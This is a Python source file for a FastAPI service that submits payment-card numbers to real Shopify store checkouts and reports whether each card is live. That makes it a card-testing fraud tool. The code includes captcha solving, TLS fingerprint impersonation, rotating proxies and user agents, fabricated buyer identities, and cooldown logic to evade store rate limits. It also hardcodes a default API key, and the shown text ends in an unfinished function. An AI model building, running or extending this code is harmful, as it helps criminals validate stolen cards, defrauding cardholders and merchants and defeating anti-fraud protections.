"""
Shopify Checkout Validator API — VPS Edition (with Captcha Solver)
High-performance, fully async, production-ready.
s
Endpoints:
  GET /shopify?site={site}&cc={capythonrd}&proxy={proxy}&key={key}
  GET /check?site={site}&card={card}&proxy={proxy}&key={key}
  GET /health
  GET /stats

Card formats:  cc|mm|yy|cvv  or  cc|mm|yyyy|cvv
Proxy formats: ip:port  |  ip:port:user:pass  |  host:port:user:pass  |  scheme://...
"""

import asyncio
import copy
import importlib
import logging
import os
import random
import re
import time
from collections import defaultdict
from contextlib import asynccontextmanager
from typing import Any, Optional, Literal
from urllib.parse import urlparse

import aiohttp
from curl_cffi.requests import AsyncSession, RequestsError
try:
    orjson = importlib.import_module("orjson")
except ImportError:  # pragma: no cover - fallback for minimal environments
    import json as _json

    class _OrjsonShim:
        JSONDecodeError = _json.JSONDecodeError

        @staticmethod
        def dumps(obj, *args, **kwargs):
            return _json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode("utf-8")

        @staticmethod
        def loads(obj, *args, **kwargs):
            return _json.loads(obj, *args, **kwargs)

    orjson = _OrjsonShim()

import uvicorn
from fastapi import FastAPI, Query, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, HTMLResponse
from dotenv import load_dotenv
load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"))

# The TLS fingerprint the stores are asked with.  The newest
# Chrome profile is refused by them (503), an older one is
# answered, so the older profile is the one that works.
IMPERSONATE = os.environ.get("SHOPIFY_IMPERSONATE", "chrome131")

# ---------------------------------------------------------------------------
# Configuration from environment
# ---------------------------------------------------------------------------
PORT             = int(os.environ.get("PORT", 8080))
WORKERS          = int(os.environ.get("WORKERS", 1))
CARDS_FILE       = os.environ.get("CARDS_FILE", "cards.txt")
MAX_PRICE        = float(os.environ.get("MAX_PRICE", 5.0))
SITE_CONCURRENCY = int(os.environ.get("SITE_CONCURRENCY", 15))
POOL_SIZE        = int(os.environ.get("POOL_SIZE", 500))
POOL_PER_HOST    = int(os.environ.get("POOL_PER_HOST", 25))
CONNECT_TIMEOUT  = float(os.environ.get("CONNECT_TIMEOUT", 8))


REQUEST_TIMEOUT  = float(os.environ.get("REQUEST_TIMEOUT", 35))
CACHE_TTL        = float(os.environ.get("CACHE_TTL", 300))
LOG_LEVEL        = os.environ.get("LOG_LEVEL", "warning").upper()
LOG_FILE         = os.environ.get("LOG_FILE", "requests.txt")

# ─── API authentication ──────────────────────────────────────────────────
VALID_API_KEYS = set(
    k.strip()
    for k in os.environ.get("API_KEYS", "oozaruhshop").split(",")
    if k.strip()
)

# ─── Captcha Solver ──────────────────────────────────────────────────────
CAPTCHA_API_KEY  = os.environ.get("CAPTCHA_API_KEY", "")
CAPTCHA_API_BASE = os.environ.get("CAPTCHA_API_BASE", "https://api.realapi.dev")

RealSolverCaptchaType = Literal["recaptchaV3", "hcaptcha_motion", "turnstile"]

# ─── Known card responses ───────────────────────────────────────────────
KNOWN_CARD_RESPONSES = frozenset({
    "ORDER_PLACED",
    "INSUFFICIENT_FUNDS",
    "INVALID_CVC",
    "3DS_REQUIRED",
    "OTP_REQUIRED",
    "EXPIRED_CARD",
    "INVALID_CARD",
    "CARD_DECLINED",
    "FRAUD_SUSPECTED",
    "DECISION_RULE_BLOCK",
    "DO_NOT_HONOR",
    "PROCESSING_ERROR",
    "GENERIC_DECLINE",
    "AMOUNT_TOO_SMALL",
    "INCORRECT_NUMBER",
    "PICK_UP_CARD",
    "TEST_MODE_LIVE_CARD",
    "INVALID_PURCHASE_TYPE",
    "INVALID_PAYMENT_METHOD",
    "STOLEN_CARD",
    "LOST_CARD",
    "RESTRICTED_CARD",
})

logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.WARNING),
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("shopify")

# ---------------------------------------------------------------------------
# Request / Response file logger
# ---------------------------------------------------------------------------
import aiofiles
import datetime

_log_lock = asyncio.Lock()
_SEP      = "=" * 70


# The request log grows by megabytes a day.  It is rotated when it
# gets too big, so a busy scan cannot fill the disk.
LOG_MAX_BYTES = int(os.environ.get("LOG_MAX_BYTES", 50 * 1024 * 1024))


async def _write_log(entry: str) -> None:
    async with _log_lock:
        try:
            try:
                if os.path.exists(LOG_FILE) and \
                        os.path.getsize(LOG_FILE) > LOG_MAX_BYTES:
                    os.replace(LOG_FILE, LOG_FILE + ".1")
            except Exception:
                pass
            async with aiofiles.open(LOG_FILE, mode="a", encoding="utf-8") as f:
                await f.write(entry)
        except Exception as ex:
            log.warning("Failed to write request log: %s", ex)


def _truncate(text: str, limit: int = 3000) -> str:
    if len(text) > limit:
        return text[:limit] + f"\n... [truncated {len(text) - limit} chars]"
    return text


async def _log_incoming(request: "Request", response_body: bytes,
                        status_code: int, elapsed_ms: float) -> None:
    now    = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    method = request.method
    url    = str(request.url)
    path   = request.url.path
    params = dict(request.query_params)
    client = request.client.host if request.client else "unknown"
    try:
        body_str = response_body.decode("utf-8", errors="replace")
    except Exception:
        body_str = "<binary>"
    entry = (
        f"\n{_SEP}\n"
        f"[{now}]  INCOMING  {method} {url}\n"
        f"Client   : {client}\n"
        f"Path     : {path}\n"
        f"Params   : {params}\n"
        f"Status   : {status_code}\n"
        f"Time     : {elapsed_ms:.1f}ms\n"
        f"Response :\n{_truncate(body_str)}\n"
        f"{_SEP}\n"
    )
    asyncio.create_task(_write_log(entry))


async def _log_outgoing(method: str, url: str, req_body,
                        status_code: int, resp_text: str,
                        elapsed_ms: float, label: str = "") -> None:
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        if isinstance(req_body, bytes):
            rb = req_body.decode("utf-8", errors="replace")
        elif req_body is None:
            rb = ""
        else:
            rb = str(req_body)
    except Exception:
        rb = "<unreadable>"
    entry = (
        f"\n{_SEP}\n"
        f"[{now}]  OUTGOING  {method} {url}"
        + (f"  [{label}]" if label else "") + "\n"
        f"Status   : {status_code}\n"
        f"Time     : {elapsed_ms:.1f}ms\n"
        f"Req Body :\n{_truncate(rb, 1500)}\n"
        f"Response :\n{_truncate(resp_text, 3000)}\n"
        f"{_SEP}\n"
    )
    asyncio.create_task(_write_log(entry))


# ---------------------------------------------------------------------------
# LoggedSession — wraps AsyncSession and logs every request
# ---------------------------------------------------------------------------
class LoggedSession:
    def __init__(self, session: "AsyncSession"):
        self._s = session

    async def _call(self, method: str, url: str, label: str = "",
                    data=None, json=None, **kwargs):
        t0 = time.time()
        req_body = data if data is not None else (
            orjson.dumps(json) if json is not None else None
        )
        try:
            if json is not None:
                resp = await getattr(self._s, method.lower())(url, json=json, **kwargs)
            elif data is not None:
                resp = await getattr(self._s, method.lower())(url, data=data, **kwargs)
            else:
                resp = await getattr(self._s, method.lower())(url, **kwargs)
            elapsed = (time.time() - t0) * 1000
            try:
                resp_text = resp.text
            except Exception:
                resp_text = "<unreadable>"
            asyncio.create_task(
                _log_outgoing(method.upper(), url, req_body,
                              resp.status_code, resp_text, elapsed, label)
            )
            return resp
        except Exception as exc:
            elapsed = (time.time() - t0) * 1000
            asyncio.create_task(
                _log_outgoing(method.upper(), url, req_body,
                              0, f"EXCEPTION: {type(exc).__name__}: {exc}",
                              elapsed, label)
            )
            raise

    async def get(self, url: str, label: str = "", **kwargs):
        return await self._call("GET", url, label=label, **kwargs)

    async def post(self, url: str, label: str = "", data=None, json=None, **kwargs):
        return await self._call("POST", url, label=label, data=data, json=json, **kwargs)

    def __getattr__(self, name):
        return getattr(self._s, name)


# ---------------------------------------------------------------------------
# Captcha Solver
# ---------------------------------------------------------------------------
def _external_captcha_allowed() -> bool:
    """The paid captcha service stays off unless it is asked for."""
    return os.environ.get("CAPTCHA_EXTERNAL", "").strip().lower() in (
        "1", "true", "yes", "on")


async def captcha_solver(
    page_url: str,
    site_key: str,
    *,
    captcha_type: RealSolverCaptchaType,
    api_key: str = CAPTCHA_API_KEY,
    api_base: str = CAPTCHA_API_BASE,
    poll_interval: float = 2.0,
    max_wait: float = 60.0,
    debug: bool = False,
    **captcha_kwargs,
):
    """Solve hCaptcha / reCAPTCHA v3 / Turnstile with a real browser.

    No outside service: the browser reads the token out of the page, so
    there is no key, no bill and nothing to leak.  The paid service is
    only used when CAPTCHA_EXTERNAL is turned on.
    """
    token = None
    try:
        from local_hcaptcha_solver import (solve_hcaptcha_local,
                                           solve_recaptcha_v3_local,
                                           solve_turnstile_local)
    except Exception as e:
        log.warning("[CAPTCHA] the local solver is missing: %s", e)
    else:
        try:
            if captcha_type == "hcaptcha_motion":
                token = await solve_hcaptcha_local(site_key, page_url,
                                                   timeout=max_wait, **captcha_kwargs)
            elif captcha_type == "recaptchaV3":
                token = await solve_recaptcha_v3_local(site_key, page_url,
                                                       timeout=max_wait, **captcha_kwargs)
            elif captcha_type == "turnstile":
                token = await solve_turnstile_local(site_key, page_url,
                                                    timeout=max_wait, **captcha_kwargs)
        except Exception as e:
            log.warning("[CAPTCHA] the local solver failed: %s", e)
        if token:
            return {"token": token}
        log.warning("[CAPTCHA] the local solver found no token")
        if not _external_captcha_allowed():
            return {"error": "no token from the local solver"}

    if not api_key:
        return {"error": "no captcha service key and the local solver found nothing"}

    headers = {'x-api-key': api_key, 'Content-Type': 'application/json'}
    payload = {
        "captcha_type": captcha_type,
        "captcha_data": {"url": page_url, "sitekey": site_key, **captcha_kwargs},
    }

    timeout = aiohttp.ClientTimeout(total=max_wait + 30)
    async with aiohttp.ClientSession(timeout=timeout) as s:
        try:
            async with s.post(f"{api_base}/create_task", json=payload, headers=headers) as r:
                create = await r.json(content_type=None)
        except Exception as e:
            return {"error": f"create_task failed: {e}"}

        task_id = create.get("task_id")
        if not task_id:
            return {"error": str(create.get("error", "no task_id"))}

        deadline = time.time() + max_wait
        while time.time() < deadline:
            try:
                async with s.get(f"{api_base}/getCaptchaResult?task_id={task_id}") as r:
                    res = await r.json(content_type=None)
            except Exception:
                await asyncio.sleep(poll_interval)
                continue

            status = res.get("status", "")
            if debug and status in ("processing", "pending"):
                log.warning("[CAPTCHA] task=%s status=%s type=%s",
                            task_id, status, captcha_type)

            if res.get("error"):
                return {"error": str(res["error"])}
            if status == "success":
                tok = res.get("token")
                if tok:
                    return {"token": tok.strip()}
                return {"error": "no token in success response"}

            await asyncio.sleep(poll_interval)

    return {"error": f"timeout after {max_wait:.0f}s"}


async def detect_and_solve_captcha(site_url: str, html: str, debug: bool = False):
    """Detect and solve any captcha present on the page."""
    html_lower = html.lower()

    if "hcaptcha" in html_lower:
        m = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
        if m:
            if debug:
                log.warning("[CAPTCHA] hCaptcha sitekey=%s", m.group(1))
            r = await captcha_solver(site_url, m.group(1),
                                     captcha_type="hcaptcha_motion", debug=debug)
            return r.get("token")

    if "recaptcha" in html_lower:
        m = (re.search(r'grecaptcha\.execute\(["\']([^"\']+)["\']', html)
             or re.search(r'data-sitekey=["\']([^"\']+)["\']', html))
        if m:
            if debug:
                log.warning("[CAPTCHA] reCAPTCHA sitekey=%s", m.group(1))
            r = await captcha_solver(site_url, m.group(1),
                                     captcha_type="recaptchaV3", debug=debug)
            return r.get("token")

    if "turnstile" in html_lower:
        m = (re.search(r'cf-turnstile[^>]*data-sitekey=["\']([^"\']+)["\']', html)
             or re.search(r'turnstile\.render\([^,]+,\s*\{\s*sitekey:\s*["\']([^"\']+)["\']', html))
        if m:
            if debug:
                log.warning("[CAPTCHA] Turnstile sitekey=%s", m.group(1))
            r = await captcha_solver(site_url, m.group(1),
                                     captcha_type="turnstile", debug=debug)
            return r.get("token")

    return None


# ---------------------------------------------------------------------------
# GraphQL Queries
# ---------------------------------------------------------------------------
_PROPOSAL_VARS = (
    "$sessionInput:SessionTokenInput!,"
    "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$checkpointData:String,$queueToken:String,"
    "$reduction:ReductionInput,"
    "$availableRedeemables:AvailableRedeemablesInput,"
    "$tip:TipTermInput,$note:NoteInput,"
    "$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,"
    "$scriptFingerprint:ScriptFingerprintInput,"
    "$transformerFingerprintV2:String,"
    "$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,"
    "$captcha:CaptchaInput,$poNumber:String,"
    "$saleAttributions:SaleAttributionsInput,"
    "$alternativePaymentCurrency:AlternativePaymentCurrencyInput,"
    "$deliveryExpectations:DeliveryExpectationTermsInput,"
    "$memberships:MembershipsInput,"
    "$cartMetafields:[CartMetafieldOperationInput!]"
)

_PROPOSAL_ARGS = (
    "delivery:$delivery,discounts:$discounts,payment:$payment,"
    "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,"
    "reduction:$reduction,availableRedeemables:$availableRedeemables,"
    "tip:$tip,note:$note,poNumber:$poNumber,"
    "nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,"
    "transformerFingerprintV2:$transformerFingerprintV2,"
    "optionalDuties:$optionalDuties,attribution:$attribution,"
    "captcha:$captcha,saleAttributions:$saleAttributions,"
    "alternativePaymentCurrency:$alternativePaymentCurrency,"
    "deliveryExpectations:$deliveryExpectations,"
    "memberships:$memberships,"
    "cartMetafields:$cartMetafields"
)

_SELLER_PROPOSAL_FIELDS = (
    "sellerProposal{"
    "runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "total{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "delivery{__typename "
    "...on FilledDeliveryTerms{deliveryLines{"
    "availableDeliveryStrategies{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "estimatedTimeInTransit{...on IntValueConstraint{value}}}}"
    "selectedDeliveryStrategy{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}"
    "tax{__typename "
    "...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}}"
    "payment{__typename "
    "...on FilledPaymentTerms{availablePaymentLines{"
    "paymentMethod{__typename "
    "...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName}"
    "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}}" 
    "__typename}"
)

QUERY_PROPOSAL_SHIPPING = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
)

_RECEIPT_FRAGMENT = (
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token __typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{"
    "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
    "...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
    "__typename}timeout{millisecondsRemaining __typename}__typename}"
    "...on FailedReceipt{id processingError{"
    "...on InventoryClaimFailure{__typename}"
    "...on InventoryReservationFailure{__typename}"
    "...on OrderCreationFailure{paymentsHaveBeenReverted __typename}"
    "...on PaymentFailed{code messageUntranslated __typename}"
    "__typename}__typename}__typename}"
)

QUERY_PROPOSAL_DELIVERY = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
    + _RECEIPT_FRAGMENT
)

MUTATION_SUBMIT = (
    "mutation SubmitForCompletion("
    "$input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],"
    "$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput)"
    "{submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields "
    "postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "...on SubmitSuccess{receipt{...ReceiptDetails}__typename}"
    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}__typename}"
    "...on SubmitFailed{reason __typename}"
    "...on SubmitRejected{"
    "errors{code localizedMessage nonLocalizedMessage __typename}__typename}"
    "...on Throttled{pollAfter pollUrl queueToken __typename}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}__typename}"
    "...on TooManyRequests{__typename}"
    "...on TooManyAttempts{__typename}"
    "__typename}}"
    + _RECEIPT_FRAGMENT
)

QUERY_POLL = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!)"
    "{receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken})"
    "{...ReceiptDetails __typename}}"
    + _RECEIPT_FRAGMENT
)

# ---------------------------------------------------------------------------
# Static data
# ---------------------------------------------------------------------------
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "AUD": "AU",
    "EUR": "DE", "NZD": "NZ", "SGD": "SG", "MYR": "MY",
    "PHP": "PH", "THB": "TH", "ZAR": "ZA", "BRL": "BR",
    "MXN": "MX", "SEK": "SE", "NOK": "NO", "DKK": "DK",
    "JPY": "JP", "KRW": "KR",
}

ADDRESS_BOOK: dict[str, dict] = {
    "US": {"address1": "123 Main St",       "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
    "CA": {"address1": "88 Queen St W",     "city": "Toronto",     "postalCode": "M5J2J3",  "zoneCode": "ON",  "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London",      "postalCode": "NW1 6XE", "zoneCode": "ENG", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG Road",      "city": "Mumbai",      "postalCode": "400001",  "zoneCode": "MH",  "countryCode": "IN", "phone": "9876543210"},
    "AE": {"address1": "Burj Khalifa Tower","city": "Dubai",       "postalCode": "00000",   "zoneCode": "DU",  "countryCode": "AE", "phone": "501234567"},
    "HK": {"address1": "88 Nathan Road",    "city": "Kowloon",     "postalCode": "000000",  "zoneCode": "KLN", "countryCode": "HK", "phone": "55555555"},
    "CH": {"address1": "Gotthardstrasse 17","city": "Schwyz",      "postalCode": "6430",    "zoneCode": "SZ",  "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place",    "city": "Sydney",      "postalCode": "2000",    "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Unter den Linden 1","city": "Berlin",      "postalCode": "10117",   "zoneCode": "BE",  "countryCode": "DE", "phone": "3012345678"},
    "FR": {"address1": "1 Rue de Rivoli",   "city": "Paris",       "postalCode": "75001",   "zoneCode": "IDF", "countryCode": "FR", "phone": "142123456"},
    "NZ": {"address1": "1 Queen Street",    "city": "Auckland",    "postalCode": "1010",    "zoneCode": "AUK", "countryCode": "NZ", "phone": "98765432"},
    "SG": {"address1": "1 Raffles Place",   "city": "Singapore",   "postalCode": "048616",  "zoneCode": "01",  "countryCode": "SG", "phone": "61234567"},
    "JP": {"address1": "1-1 Marunouchi",    "city": "Tokyo",       "postalCode": "100-0005","zoneCode": "13",  "countryCode": "JP", "phone": "312345678"},
    "BR": {"address1": "Av. Paulista 1000", "city": "Sao Paulo",   "postalCode": "01310-100","zoneCode": "SP", "countryCode": "BR", "phone": "1112345678"},
    "MX": {"address1": "Paseo de la Reforma 1","city": "Mexico City","postalCode": "06600", "zoneCode": "CMX","countryCode": "MX", "phone": "5512345678"},
    "SE": {"address1": "Drottninggatan 1",  "city": "Stockholm",   "postalCode": "11151",   "zoneCode": "AB",  "countryCode": "SE", "phone": "812345678"},
    "DEFAULT": {"address1": "123 Main St",  "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
}

FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas",
               "Mary","Patricia","Jennifer","Linda","Barbara","Susan","Jessica","Sarah","Karen",
               "Emily","Ashley","Daniel","Matthew","Andrew","Joshua","Christopher","Ryan","Tyler"]
LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez",
               "Martinez","Hernandez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Lee",
               "White","Harris","Martin","Thompson","Turner","Mitchell","Campbell","Roberts","Evans"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","protonmail.com","icloud.com","hotmail.com",
                 "live.com","mail.com","aol.com"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
]

class _PriceOverMax(Exception):
    """Raised when the real total (product + shipping + tax) is over the cap.

    Not a site error -- the next cheap product may still fit, so the caller
    retries with another candidate.
    """


# ---------------------------------------------------------------------------
# Global process-level state
# ---------------------------------------------------------------------------
_shared_session: Optional[LoggedSession] = None
_site_semaphores: dict[str, asyncio.Semaphore] = defaultdict(
    lambda: asyncio.Semaphore(SITE_CONCURRENCY)
)

_product_cache: dict[str, dict] = {}

# One product fetch per store at a time.  Without this, every worker
# that starts at the same moment asks the store for its product list
# and the store answers none of them -- the product endpoint is the
# first thing a store throttles, and 24 workers hitting it together
# turned a whole scan into "No products found".
_product_locks: dict[str, asyncio.Lock] = defaultdict(asyncio.Lock)

# A fetch that FAILED is only remembered for a short time.  A store
# that throttled one request must not be written off for the whole
# cache life: that turned a five second hiccup into five minutes of
# "No products found" for every card.
PRODUCT_FAIL_TTL = float(os.environ.get("PRODUCT_FAIL_TTL", 20))


def _product_cache_ttl(entry: dict) -> float:
    """How long this cache entry may be used."""
    if not entry:
        return 0.0
    return CACHE_TTL if entry.get("ok") else PRODUCT_FAIL_TTL

_cards_cache: list[dict] = []
_cards_loaded_at: float  = 0.0


# ---------------------------------------------------------------------------
# App lifecycle
# ---------------------------------------------------------------------------
@asynccontextmanager
async def lifespan(app: FastAPI):
    global _shared_session
    _shared_session = LoggedSession(AsyncSession(impersonate=IMPERSONATE, timeout=REQUEST_TIMEOUT))
    # The proxy pool is checked in the background.  The service has to
    # start serving at once: a check that arrives while it is still
    # starting is a failed check.  Until the check is done the pool is
    # used as it is.
    try:
        asyncio.create_task(_healthy_pool())
    except Exception:
        pass
    _reload_cards()
    log.warning("Shopify Validator API started pool=%d/host concurrency=%d/site keys=%d",
                POOL_SIZE, SITE_CONCURRENCY, len(VALID_API_KEYS))
    yield
    if _shared_session:
        res = _shared_session.close()
        if asyncio.iscoroutine(res):
            await res


app = FastAPI(title="Shopify Validator", version="3.3.0", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

_stats: dict[str, int] = defaultdict(int)


# ---------------------------------------------------------------------------
# Utility helpers
# ---------------------------------------------------------------------------

SITES_FILE = os.environ.get("SITES_FILE", "site.txt")
_sites_cache: list[str] = []
_sites_loaded_at: float = 0.0


# A store that refuses the checkout (Cloudflare rate limit, a busy shop)
# is put aside for a while instead of being asked again and again.
# Asking a throttled store only wastes the card's time: the traffic
# belongs to the stores that still answer.
_store_cooldown: dict[str, float] = defaultdict(float)
_store_fails: dict[str, int] = defaultdict(int)
STORE_COOLDOWN = float(os.environ.get("STORE_COOLDOWN", 45))
STORE_COOLDOWN_MAX = float(os.environ.get("STORE_COOLDOWN_MAX", 300))


def _host_of(site: str) -> str:
    s = site if site.startswith("http") else f"https://{site}"
    return urlparse(s).netloc


def _store_penalise(site: str, seconds: float = 0.0) -> None:
    """Put a store aside for a while."""
    host = _host_of(site)
    _store_fails[host] += 1
    mult = min(1.0 + (_store_fails[host] - 1) * 0.5, 6.0)
    wait = min(max(seconds, STORE_COOLDOWN * mult), STORE_COOLDOWN_MAX)
    _store_cooldown[host] = time.time() + wait


def _store_pardon(site: str) -> None:
    """The store answered, so it is in the clear again."""
    _store_fails[_host_of(site)] = 0
    _store_cooldown.pop(_host_of(site), None)


def _stores_ready(sites: list[str]) -> list[str]:
    """The stores that are not in a cooldown.

    If every store is cooling down, all of them are used: a slow store
    still beats no store at all.
    """
    ready = [s for s in sites
             if time.time() >= _store_cooldown.get(_host_of(s), 0.0)]
    return ready if ready else list(sites)


# The stores rate limit the VPS address, so a check has to come from
# somewhere else.  Every proxy in the pool has its own exit address, so
# the checkers spread over them instead of hammering one.
_proxy_pool: list[str] = []
_proxy_pool_at: float = 0.0
PROXY_POOL_TTL = float(os.environ.get("PROXY_POOL_TTL", 300))
PROXY_POOL_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                               "proxies.txt")
BOT_PROXY_FILE = "/root/hitchecker/bot/user_proxies.json"


def _load_proxy_pool() -> list[str]:
    """Every proxy the bot holds, for the validator to use."""
    global _proxy_pool, _proxy_pool_at
    now = time.time()
    if _proxy_pool and (now - _proxy_pool_at) < PROXY_POOL_TTL:
        return _proxy_pool
    out: list[str] = []
    try:
        with open(PROXY_POOL_FILE) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    out.append(line)
    except Exception:
        pass
    if not out:
        try:
            with open(BOT_PROXY_FILE) as f:
                data = orjson.loads(f.read())
            for u in data.values():
                for p in (u.get("proxies") or []):
                    if p and p not in out:
                        out.append(p)
        except Exception:
            pass
    _proxy_pool = out
    _proxy_pool_at = now
    return out


_proxy_healthy: list[str] = []
_proxy_healthy_at: float = 0.0
# Which proxies answer, by their raw text.  A dead proxy would cost the
# whole check, so it is never used.
_proxy_health: dict[str, bool] = {}
PROXY_HEALTH_TTL = float(os.environ.get("PROXY_HEALTH_TTL", 600))


async def _check_proxies(pool: list[str], timeout=6) -> list[str]:
    """The proxies that answer.

    A dead proxy would cost the whole check (the timeout is longer than
    any checkout), so they are tested once and the dead ones dropped.
    """
    import aiohttp
    good: list[str] = []

    async def probe(raw: str):
        p = _parse_proxy(raw)
        if not p:
            return None
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get("https://api.ipify.org?format=json",
                                 proxy=p,
                                 timeout=aiohttp.ClientTimeout(total=timeout)) as r:
                    ok = r.status == 200
                    # The key is the FORMATTED proxy, so the pool (which
                    # holds the raw text) and the lists the bot sends
                    # (already formatted) talk about the same proxy.
                    _proxy_health[p] = ok
                    return p if ok else None
        except Exception:
            _proxy_health[p] = False
            return None

    for i in range(0, len(pool), 30):
        chunk = pool[i:i + 30]
        res = await asyncio.gather(*[probe(p) for p in chunk])
        good.extend([p for p in res if p])
    # the pool keeps the raw text, the health map the formatted one
    return [p for p in pool if _proxy_health.get(_parse_proxy(p) or "", False)]


async def _healthy_pool() -> list[str]:
    """The pool, with the dead proxies taken out."""
    global _proxy_healthy, _proxy_healthy_at
    pool = _load_proxy_pool()
    if not pool:
        return []
    now = time.time()
    if _proxy_healthy and (now - _proxy_healthy_at) < PROXY_HEALTH_TTL:
        return _proxy_healthy
    healthy = await _check_proxies(pool)
    if healthy:
        _proxy_healthy = healthy
        _proxy_healthy_at = now
        log.warning("proxy pool: %d of %d answer", len(healthy), len(pool))
        return healthy
    return pool


def _pick_rescue_proxy(raw: Optional[str]) -> Optional[str]:
    """A proxy to use when the store is rate limiting us.

    The list the caller passed comes first, then the pool.  The proxies
    that are known to be dead are left out.
    """
    if raw:
        choices = [p.strip() for p in raw.split(",") if p.strip()]
        good = [p for p in choices if _proxy_health.get(p, True)]
        if good:
            return random.choice(good)
    pool = _proxy_healthy or _load_proxy_pool()
    healthy = [p for p in pool if _proxy_health.get(_parse_proxy(p) or "", True)]
    if healthy:
        return random.choice(healthy)
    return _pick_pool_proxy()


def _pick_pool_proxy() -> Optional[str]:
    """One proxy from the pool, or nothing when there is no pool."""
